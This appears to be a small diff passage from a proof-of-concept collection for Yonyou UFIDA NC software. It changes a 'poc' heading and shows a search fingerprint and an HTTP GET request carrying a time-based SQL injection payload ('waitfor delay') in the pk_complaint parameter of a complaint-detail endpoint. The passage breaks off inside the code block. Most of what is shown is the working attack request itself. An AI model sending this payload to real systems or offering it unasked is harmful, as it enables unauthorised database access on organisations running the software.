@@ -12,7 +12,7 @@ app="用友-UFIDA-NC"
 
 
 
-## poc
+## POC
 
 ```
 GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
